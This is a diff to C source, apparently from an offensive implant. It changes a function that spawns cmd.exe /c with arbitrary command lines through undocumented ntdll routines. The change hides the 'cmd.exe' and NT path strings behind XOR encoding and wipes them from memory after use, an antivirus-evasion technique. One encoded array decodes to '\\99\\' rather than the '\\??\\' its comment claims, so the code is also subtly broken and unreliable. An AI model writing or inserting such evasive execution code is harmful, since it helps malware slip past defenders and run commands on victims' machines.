@@ -857,15 +857,20 @@ static NTSTATUS NT_exec_cmdline(
         GetProcAddress(ntdll, "RtlDestroyProcessParameters");
     if (!fnCreate) return (NTSTATUS)0xC0000001L;
 
-    /* Build full cmd.exe path */
     char sysdir[MAX_PATH];
     GetSystemDirectoryA(sysdir, sizeof(sysdir));
+    /* "\\??\\" XOR 0x4B */
+    char _np[] = {0x17,0x72,0x72,0x17,0x00}; xdec(_np, 4);
+    /* "\\cmd.exe" XOR 0x4B */
+    char _ce[] = {0x17,0x28,0x26,0x2F,0x65,0x2E,0x33,0x2E,0x00}; xdec(_ce, 8);
     char imgpath[MAX_PATH];
-    snprintf(imgpath, sizeof(imgpath), "\\??\\%s\\cmd.exe", sysdir);
-
-    /* Build command line: "cmd.exe /c <cmdline>" */
+    snprintf(imgpath, sizeof(imgpath), "%s%s%s", _np, sysdir, _ce);
+    SecureZeroMemory(_np, sizeof(_np)); SecureZeroMemory(_ce, sizeof(_ce));
+    /* "cmd.exe /c " XOR 0x4B */
+    char _cc[] = {0x28,0x26,0x2F,0x65,0x2E,0x33,0x2E,0x6B,0x64,0x28,0x6B,0x00}; xdec(_cc, 11);
     char cmdline_full[4096 + 64];
-    snprintf(cmdline_full, sizeof(cmdline_full), "cmd.exe /c %s", cmdline);
+    snprintf(cmdline_full, sizeof(cmdline_full), "%s%s", _cc, cmdline);
+    SecureZeroMemory(_cc, sizeof(_cc));
 
     GATE_UNICODE_STRING usImagePath = gate_str_from_ascii(imgpath);
     GATE_UNICODE_STRING usCmdLine   = gate_str_from_ascii(cmdline_full);
